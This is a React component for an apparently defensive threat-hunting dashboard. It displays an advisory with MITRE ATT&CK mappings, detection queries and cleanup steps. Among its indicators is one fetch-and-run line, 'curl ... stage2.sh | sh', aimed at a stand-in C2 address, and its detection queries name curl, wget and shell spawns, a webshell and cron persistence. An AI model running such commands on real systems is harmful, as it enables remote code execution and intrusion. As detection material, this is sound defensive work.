import React, { useState } from 'react'
import {
  FileText, ShieldAlert, Calendar, Terminal, Hash,
  CheckCircle2, AlertTriangle, Layers, ExternalLink,
  ShieldCheck, Cpu, ArrowRight, BookOpen, Bug, Search,
  Radio, Lock
} from 'lucide-react'
import { Advisory } from '../types'

interface AdvisoryDetailViewProps {
  advisory: Advisory
}

export const AdvisoryDetailView: React.FC<AdvisoryDetailViewProps> = ({ advisory }) => {
  const [selectedSentenceId, setSelectedSentenceId] = useState<string | null>('S-1')
  const [activeTab, setActiveTab] = useState<'intel' | 'mitre' | 'hunt_hypotheses'>('intel')

  // MITRE ATT&CK mappings derived from PRD advisory
  const mitreTactics = [
    {
      tactic: 'Initial Access',
      technique: 'T1190',
      name: 'Exploit Public-Facing Application',
      phase: 'Step 1: Web Request',
      evidenceQuery: "source_type = 'web_log' AND (path LIKE '%/api/v2/cluster/sync%' OR status_code = 500)",
      confidence: 'High (0.98)',
      status: 'Observed in S2, S3, S5'
    },
    {
      tactic: 'Execution',
      technique: 'T1059.004',
      name: 'Command and Scripting Interpreter: Unix Shell',
      phase: 'Step 2: Process Spawn',
      evidenceQuery: "source_type = 'edr' AND process_name IN ('bash', 'sh', 'python3', 'curl', 'wget')",
      confidence: 'High (0.99)',
      status: 'Observed in S2, S3, S5'
    },
    {
      tactic: 'Persistence',
      technique: 'T1505.003',
      name: 'Server Software Component: Web Shell',
      phase: 'Step 3: Post-Exploitation',
      evidenceQuery: "source_type = 'edr' AND file_path LIKE '%.jsp' AND event_action IN ('file_write', 'process_start')",
      confidence: 'Definitive (1.0)',
      status: 'Observed in S3 (Post-Patch)'
    },
    {
      tactic: 'Persistence',
      technique: 'T1053.003',
      name: 'Scheduled Task/Job: Cron',
      phase: 'Step 4: Persistence Maintenance',
      evidenceQuery: "source_type = 'edr' AND (file_path LIKE '%cron%' OR cmdline LIKE '%cron%')",
      confidence: 'Definitive (1.0)',
      status: 'Observed in S5 (Re-Check Catch)'
    }
  ]

  const sentenceToHypothesisMap: Record<string, { hypothesis: string; querySnippet: string; iocLinked: string }> = {
    'S-1': {
      hypothesis: 'H1: Ingress web-tier exploitation via unauthenticated POST to /api/v2/cluster/sync',
      querySnippet: "SELECT * FROM telemetry WHERE path = '/api/v2/cluster/sync' AND status_code = 500",
      iocLinked: '/api/v2/cluster/sync'
    },
    'S-2': {
      hypothesis: 'H2: Web process spawned suspicious child shells (curl/wget/sh pipes)',
      querySnippet: "SELECT * FROM telemetry WHERE parent_process = 'java' AND process_name IN ('sh','curl')",
      iocLinked: 'curl -fsSL http://198.51.100.42:8080/stage2.sh | sh'
    },
    'S-3': {
      hypothesis: 'H3: Post-exploitation webshell artifact written to disk',
      querySnippet: "SELECT * FROM telemetry WHERE file_path LIKE '%/cluster_mgr.jsp%'",
      iocLinked: '/var/www/html/cluster_mgr.jsp'
    },
    'S-4': {
      hypothesis: 'H4: Secondary outbound lateral communication / C2 beaconing',
      querySnippet: "SELECT * FROM telemetry WHERE dest_ip IN ('198.51.100.42', '203.0.113.88')",
      iocLinked: '198.51.100.42, 203.0.113.88'
    },
    'S-5': {
      hypothesis: 'H4.2: Post-patch persistence execution via crontab entry',
      querySnippet: "SELECT * FROM telemetry WHERE cmdline LIKE '%/etc/cron.d/sync_worker%'",
      iocLinked: '/etc/cron.d/sync_worker'
    }
  }

  return (
    <div className="flex-1 p-6 space-y-5 max-w-7xl mx-auto w-full font-sans text-[#111B36] dark:text-[#FFFFFF]">
      {/* CISA KEV / Mandiant Threat Intelligence Header Banner */}
      <div className="bg-white dark:bg-[#121214] p-5 rounded-2xl border border-[#E1E9F2] dark:border-[#222225] space-y-4 shadow-sm">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-3 border-b border-[#E1E9F2] dark:border-[#222225]">
          <div className="flex items-center gap-2.5 flex-wrap">
            <span className="text-[10px] font-mono px-2.5 py-0.5 rounded font-black tracking-wider bg-[#FEE2E2] dark:bg-[#1A1314] text-[#DC2626] dark:text-[#F87171] border border-[#FECACA] dark:border-[#3D1F23] uppercase flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 rounded-full bg-[#DC2626] dark:bg-[#F87171] animate-pulse" />
              CISA KEV · ACTIVE EXPLOITATION
            </span>
            <span className="text-[10px] font-mono px-2.5 py-0.5 rounded bg-[#E6EEF7] dark:bg-[#18181B] text-[#5E82A7] dark:text-[#A1A1AA] border border-[#C1D0E2] dark:border-[#27272A] font-semibold">
              ID: {advisory.id}
            </span>
            <span className="text-[10px] font-mono px-2.5 py-0.5 rounded bg-[#F7FAFD] dark:bg-[#18181B] text-[#64748B] dark:text-[#8E8E93] border border-[#E1E9F2] dark:border-[#27272A]">
              RFC 8785 CANONICAL EXTRACT
            </span>
            <span className="text-[10px] font-mono px-2.5 py-0.5 rounded bg-[#D1FAE5] dark:bg-[#121915] text-[#047857] dark:text-[#34D399] border border-[#A7F3D0] dark:border-[#1E3A2F] flex items-center gap-1 font-semibold">
              <Lock className="w-3 h-3" /> INPUT SCREENED (0% INJECTION)
            </span>
          </div>

          <div className="flex items-center gap-2">
            <span className="text-xs font-mono text-[#64748B] dark:text-[#8E8E93]">CVSS v3.1 Base Score:</span>
            <span className="text-sm font-mono font-black text-[#DC2626] dark:text-[#F87171] px-2.5 py-0.5 rounded bg-[#FEE2E2] dark:bg-[#1A1314] border border-[#FECACA] dark:border-[#3D1F23]">
              9.8 CRITICAL
            </span>
          </div>
        </div>

        <div>
          <h1 className="text-xl md:text-2xl font-black text-[#111B36] dark:text-white tracking-tight">
            {advisory.title}
          </h1>
          <p className="text-xs font-mono text-[#64748B] dark:text-[#8E8E93] mt-1 flex items-center gap-2 flex-wrap">
            <span>Vendor: <strong className="text-[#111B36] dark:text-white">{advisory.vendor}</strong></span>
            <span>·</span>
            <span>Product: <strong className="text-[#5E82A7] dark:text-[#D4D4D8]">{advisory.product}</strong></span>
            <span>·</span>
            <span>Vector: <code className="text-[#111B36] dark:text-[#E4E4E7] text-[11px] bg-[#F7FAFD] dark:bg-[#18181B] px-1.5 py-0.5 rounded border border-[#E1E9F2] dark:border-[#27272A]">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></span>
          </p>
        </div>

        {/* Threat Timeline Strip */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2 pt-2 border-t border-[#E1E9F2] dark:border-[#222225] font-mono text-xs">
          <div className="p-2.5 rounded-xl bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A]">
            <span className="text-[#64748B] dark:text-[#8E8E93] text-[10px] block font-bold">AFFECTED VERSIONS:</span>
            <span className="font-bold text-[#DC2626] dark:text-[#F87171] mt-0.5 block truncate">
              {advisory.affected_versions.join(' & ')}
            </span>
          </div>
          <div className="p-2.5 rounded-xl bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A]">
            <span className="text-[#64748B] dark:text-[#8E8E93] text-[10px] block font-bold">FIRST EXPLOIT IN WILD:</span>
            <span className="font-bold text-[#B45309] dark:text-[#FBBF24] mt-0.5 block">
              {advisory.first_known_exploitation_date.slice(0, 10)} (-5d zero-day)
            </span>
          </div>
          <div className="p-2.5 rounded-xl bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A]">
            <span className="text-[#64748B] dark:text-[#8E8E93] text-[10px] block font-bold">PUBLIC DISCLOSURE:</span>
            <span className="font-bold text-[#5E82A7] dark:text-[#E4E4E7] mt-0.5 block">
              {advisory.disclosure_date.slice(0, 10)}
            </span>
          </div>
          <div className="p-2.5 rounded-xl bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A]">
            <span className="text-[#64748B] dark:text-[#8E8E93] text-[10px] block font-bold">MANDATED LOOKBACK:</span>
            <span className="font-bold text-[#111B36] dark:text-white mt-0.5 block">
              45 Days Historical Depth
            </span>
          </div>
        </div>
      </div>

      {/* Navigation Tabs */}
      <div className="flex items-center gap-2 border-b border-[#E1E9F2] dark:border-[#222225] pb-2 font-mono text-xs">
        <button
          onClick={() => setActiveTab('intel')}
          className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl transition font-semibold cursor-pointer ${
            activeTab === 'intel'
              ? 'bg-[#E6EEF7] dark:bg-[#222225] text-[#111B36] dark:text-white border border-[#7194B7] dark:border-[#52525B] shadow-xs'
              : 'text-[#64748B] dark:text-[#8E8E93] hover:text-[#111B36] dark:hover:text-white hover:bg-[#F7FAFD] dark:hover:bg-[#18181B]'
          }`}
        >
          <FileText className="w-3.5 h-3.5" />
          Sentence-Level Citations &amp; Provable Grounding
        </button>
        <button
          onClick={() => setActiveTab('mitre')}
          className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl transition font-semibold cursor-pointer ${
            activeTab === 'mitre'
              ? 'bg-[#E6EEF7] dark:bg-[#222225] text-[#111B36] dark:text-white border border-[#7194B7] dark:border-[#52525B] shadow-xs'
              : 'text-[#64748B] dark:text-[#8E8E93] hover:text-[#111B36] dark:hover:text-white hover:bg-[#F7FAFD] dark:hover:bg-[#18181B]'
          }`}
        >
          <Layers className="w-3.5 h-3.5" />
          MITRE ATT&amp;CK Matrix Mapping
        </button>
        <button
          onClick={() => setActiveTab('hunt_hypotheses')}
          className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl transition font-semibold cursor-pointer ${
            activeTab === 'hunt_hypotheses'
              ? 'bg-[#E6EEF7] dark:bg-[#222225] text-[#111B36] dark:text-white border border-[#7194B7] dark:border-[#52525B] shadow-xs'
              : 'text-[#64748B] dark:text-[#8E8E93] hover:text-[#111B36] dark:hover:text-white hover:bg-[#F7FAFD] dark:hover:bg-[#18181B]'
          }`}
        >
          <Terminal className="w-3.5 h-3.5" />
          Extracted Hunt Hypotheses (H1–H4)
        </button>
      </div>

      {/* Tab 1: Sentence-Level Citation Linking */}
      {activeTab === 'intel' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 font-mono text-xs">
          {/* Left Column: Sentences list */}
          <div className="lg:col-span-7 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-[11px] font-bold text-[#111B36] dark:text-white uppercase tracking-wider">
                Extracted Source Sentences (Click to Trace Evidence)
              </span>
              <span className="text-[10px] text-[#64748B] dark:text-[#8E8E93]">
                Strict provenance tracking
              </span>
            </div>

            <div className="space-y-2">
              {advisory.source_sentences.map((sent) => {
                const isSelected = selectedSentenceId === sent.id
                return (
                  <div
                    key={sent.id}
                    onClick={() => setSelectedSentenceId(sent.id)}
                    className={`p-3.5 rounded-xl border transition cursor-pointer shadow-2xs ${
                      isSelected
                        ? 'bg-[#E6EEF7] dark:bg-[#18181B] border-[#7194B7] dark:border-[#52525B] shadow-xs'
                        : 'bg-white dark:bg-[#121214] border-[#E1E9F2] dark:border-[#222225] hover:border-[#84A3C4] dark:hover:border-[#3F3F46] hover:bg-[#F7FAFD] dark:hover:bg-[#18181B]'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1.5">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                        isSelected
                          ? 'bg-[#7194B7] dark:bg-[#27272A] text-white'
                          : 'bg-[#F7FAFD] dark:bg-[#18181B] text-[#5E82A7] dark:text-[#A1A1AA] border border-[#E1E9F2] dark:border-[#27272A]'
                      }`}>
                        SENTENCE {sent.id}
                      </span>
                      <span className="text-[10px] text-[#64748B] dark:text-[#8E8E93]">
                        Verified by Canonical Lexer
                      </span>
                    </div>
                    <p className="text-[#111B36] dark:text-slate-200 font-sans text-xs leading-relaxed">
                      "{sent.sentence}"
                    </p>
                  </div>
                )
              })}
            </div>
          </div>

          {/* Right Column: Sentence to Hunt Mapping Inspector */}
          <div className="lg:col-span-5 space-y-3">
            <div className="text-[11px] font-bold text-[#111B36] dark:text-white uppercase tracking-wider">
              Cryptographic Claim Grounding
            </div>

            {selectedSentenceId && sentenceToHypothesisMap[selectedSentenceId] ? (
              <div className="bg-white dark:bg-[#121214] p-4 rounded-xl border border-[#7194B7] dark:border-[#222225] space-y-3 shadow-xs">
                <div className="flex items-center justify-between pb-2 border-b border-[#E1E9F2] dark:border-[#222225]">
                  <span className="text-[#111B36] dark:text-white font-bold">Citation Target: {selectedSentenceId}</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-[#D1FAE5] dark:bg-[#121915] text-[#047857] dark:text-[#34D399] border border-[#A7F3D0] dark:border-[#1E3A2F] font-bold">
                    100% GROUNDED
                  </span>
                </div>

                <div>
                  <span className="text-[#64748B] dark:text-[#8E8E93] text-[10px] block font-bold">DERIVED HUNT HYPOTHESIS:</span>
                  <p className="text-[#111B36] dark:text-white font-semibold mt-0.5">
                    {sentenceToHypothesisMap[selectedSentenceId].hypothesis}
                  </p>
                </div>

                <div>
                  <span className="text-[#64748B] dark:text-[#8E8E93] text-[10px] block font-bold">CORRESPONDING DUCKDB QUERY:</span>
                  <pre className="p-2.5 rounded-xl bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A] text-[#5E82A7] dark:text-[#A1A1AA] text-[11px] overflow-x-auto mt-1 font-mono font-medium">
                    {sentenceToHypothesisMap[selectedSentenceId].querySnippet}
                  </pre>
                </div>

                <div>
                  <span className="text-[#64748B] dark:text-[#8E8E93] text-[10px] block font-bold">EXTRACTED IOC TOKEN:</span>
                  <code className="text-[#B45309] dark:text-[#FBBF24] text-xs bg-[#FEF3C7] dark:bg-[#1A1713] px-2 py-1 rounded-lg border border-[#FDE68A] dark:border-[#3B2D18] block mt-1 break-all select-all font-semibold font-mono">
                    {sentenceToHypothesisMap[selectedSentenceId].iocLinked}
                  </code>
                </div>

                <div className="p-2.5 rounded-xl bg-[#D1FAE5] dark:bg-[#121915] border border-[#A7F3D0] dark:border-[#1E3A2F] text-[11px] text-[#047857] dark:text-[#34D399] font-sans leading-relaxed">
                  <ShieldCheck className="w-3.5 h-3.5 text-[#047857] dark:text-[#34D399] inline mr-1" />
                  <strong>Zero-Hallucination Guarantee:</strong> This hypothesis cannot run without explicit textual confirmation in advisory sentence <strong>{selectedSentenceId}</strong>.
                </div>
              </div>
            ) : (
              <div className="bg-white dark:bg-[#121214] p-6 rounded-xl border border-[#E1E9F2] dark:border-[#222225] text-center text-[#64748B] dark:text-[#8E8E93]">
                Select a sentence on the left to inspect its derived hunt query.
              </div>
            )}

            {/* Extracted IOCs Card */}
            <div className="bg-white dark:bg-[#121214] p-4 rounded-xl border border-[#E1E9F2] dark:border-[#222225] space-y-2 shadow-2xs">
              <span className="text-[#111B36] dark:text-white font-bold flex items-center gap-1.5 text-xs">
                <Hash className="w-3.5 h-3.5 text-[#7194B7] dark:text-[#8E8E93]" /> Complete IOC Register (4 items):
              </span>
              <div className="space-y-1">
                {advisory.indicators.map((ioc, idx) => (
                  <div key={idx} className="p-2 rounded-lg bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A] text-[#111B36] dark:text-slate-200 text-[11px] select-all flex items-center justify-between font-mono">
                    <code>{ioc}</code>
                    <span className="text-[10px] text-[#64748B] dark:text-[#8E8E93]">HUNT-MATCH</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab 2: MITRE ATT&CK Matrix */}
      {activeTab === 'mitre' && (
        <div className="space-y-4 font-mono text-xs">
          <div className="bg-white dark:bg-[#121214] p-4 rounded-xl border border-[#E1E9F2] dark:border-[#222225] flex items-center justify-between shadow-2xs">
            <div>
              <h3 className="font-bold text-[#111B36] dark:text-white text-sm">Enterprise MITRE ATT&amp;CK Alignment</h3>
              <p className="text-xs text-[#64748B] dark:text-[#8E8E93] font-sans mt-0.5">
                Every forensic hunting hypothesis corresponds to a standardized adversarial tactic, technique, and telemetry source.
              </p>
            </div>
            <span className="px-3 py-1 rounded-lg bg-[#E6EEF7] dark:bg-[#18181B] text-[#5E82A7] dark:text-[#A1A1AA] border border-[#C1D0E2] dark:border-[#27272A] text-xs font-bold">
              v14 Enterprise
            </span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {mitreTactics.map((m, idx) => (
              <div key={idx} className="bg-white dark:bg-[#121214] p-4 rounded-xl border border-[#E1E9F2] dark:border-[#222225] space-y-2.5 shadow-2xs">
                <div className="flex items-center justify-between">
                  <span className="px-2 py-0.5 rounded bg-[#E6EEF7] dark:bg-[#18181B] text-[#5E82A7] dark:text-[#A1A1AA] border border-[#C1D0E2] dark:border-[#27272A] text-[10px] font-bold">
                    {m.technique} · {m.tactic.toUpperCase()}
                  </span>
                  <span className="text-[10px] text-[#047857] dark:text-[#34D399] font-bold">
                    Confidence: {m.confidence}
                  </span>
                </div>

                <h4 className="text-sm font-bold text-[#111B36] dark:text-white">{m.name}</h4>
                <div className="text-[11px] text-[#64748B] dark:text-[#8E8E93] font-sans">
                  Attack Phase: <strong className="text-[#111B36] dark:text-white">{m.phase}</strong>
                </div>

                <div className="p-2.5 rounded-lg bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A] space-y-1">
                  <span className="text-[10px] text-[#64748B] dark:text-[#8E8E93] block font-bold">COLUMNAR SEARCH QUERY:</span>
                  <code className="text-[#5E82A7] dark:text-[#A1A1AA] text-[11px] block break-all font-medium font-mono">
                    {m.evidenceQuery}
                  </code>
                </div>

                <div className="text-[11px] text-[#64748B] dark:text-[#8E8E93] pt-1 border-t border-[#E1E9F2] dark:border-[#222225] flex items-center justify-between">
                  <span>Simulated Presence:</span>
                  <span className="text-[#B45309] dark:text-[#FBBF24] font-bold">{m.status}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Tab 3: Extracted Hunt Hypotheses (H1-H4) & Cleanup Notes */}
      {activeTab === 'hunt_hypotheses' && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5 font-mono text-xs">
          <div className="bg-white dark:bg-[#121214] p-4 rounded-xl border border-[#E1E9F2] dark:border-[#222225] space-y-3 shadow-2xs">
            <h4 className="font-bold text-[#111B36] dark:text-white flex items-center gap-2 text-sm border-b border-[#E1E9F2] dark:border-[#222225] pb-2">
              <Terminal className="w-4 h-4 text-[#7194B7] dark:text-[#8E8E93]" />
              Automated Forensic Hunt Engine
            </h4>
            <div className="space-y-2.5">
              <div className="p-3 rounded-lg bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A] space-y-1">
                <span className="text-[#5E82A7] dark:text-white font-bold block">H1: Ingress Web Exploit</span>
                <p className="text-[#64748B] dark:text-[#8E8E93] text-xs font-sans">
                  Scans Nginx, Apache, and Cloudflare access logs for <code className="text-[#111B36] dark:text-[#E4E4E7]">/api/v2/cluster/sync</code> with 500 error code.
                </p>
              </div>
              <div className="p-3 rounded-lg bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A] space-y-1">
                <span className="text-[#5E82A7] dark:text-white font-bold block">H2: Shell Execution</span>
                <p className="text-[#64748B] dark:text-[#8E8E93] text-xs font-sans">
                  Scans EDR process telemetry for Java parent processes spawning <code className="text-[#111B36] dark:text-[#E4E4E7]">bash</code>, <code className="text-[#111B36] dark:text-[#E4E4E7]">curl</code>, or <code className="text-[#111B36] dark:text-[#E4E4E7]">wget</code>.
                </p>
              </div>
              <div className="p-3 rounded-lg bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A] space-y-1">
                <span className="text-[#5E82A7] dark:text-white font-bold block">H3: Webshell Drop</span>
                <p className="text-[#64748B] dark:text-[#8E8E93] text-xs font-sans">
                  Scans filesystem modifications for <code className="text-[#111B36] dark:text-[#E4E4E7]">cluster_mgr.jsp</code> within webroot directory trees.
                </p>
              </div>
              <div className="p-3 rounded-lg bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A] space-y-1">
                <span className="text-[#5E82A7] dark:text-white font-bold block">H4: Lateral Pivot &amp; Egress</span>
                <p className="text-[#64748B] dark:text-[#8E8E93] text-xs font-sans">
                  Scans NetFlow/VPC flow logs for outbound connections to adversary C2 IP <code className="text-[#111B36] dark:text-[#E4E4E7]">198.51.100.42</code>.
                </p>
              </div>
            </div>
          </div>

          <div className="bg-white dark:bg-[#121214] p-4 rounded-xl border border-[#E1E9F2] dark:border-[#222225] space-y-3 shadow-2xs">
            <h4 className="font-bold text-[#047857] dark:text-[#34D399] flex items-center gap-2 text-sm border-b border-[#E1E9F2] dark:border-[#222225] pb-2">
              <CheckCircle2 className="w-4 h-4 text-[#047857] dark:text-[#34D399]" />
              Required Post-Patch Remediation Playbook
            </h4>
            <p className="text-[#64748B] dark:text-[#8E8E93] text-xs font-sans">
              Critical operational mandate: Patching binary packages alone leaves attacker backdoors active. The following remediation actions are strictly enforced before Patch Gate clearance:
            </p>
            <div className="space-y-2">
              {advisory.cleanup_notes.map((note, idx) => (
                <div key={idx} className="p-2.5 rounded-lg bg-[#F7FAFD] dark:bg-[#18181B] border border-[#E1E9F2] dark:border-[#27272A] flex items-start gap-2.5">
                  <span className="w-5 h-5 rounded-full bg-[#D1FAE5] dark:bg-[#121915] text-[#047857] dark:text-[#34D399] border border-[#A7F3D0] dark:border-[#1E3A2F] text-[10px] font-bold flex items-center justify-center shrink-0 mt-0.5">
                    {idx + 1}
                  </span>
                  <span className="text-[#111B36] dark:text-slate-200 text-xs font-sans leading-relaxed">
                    {note}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

export default AdvisoryDetailView
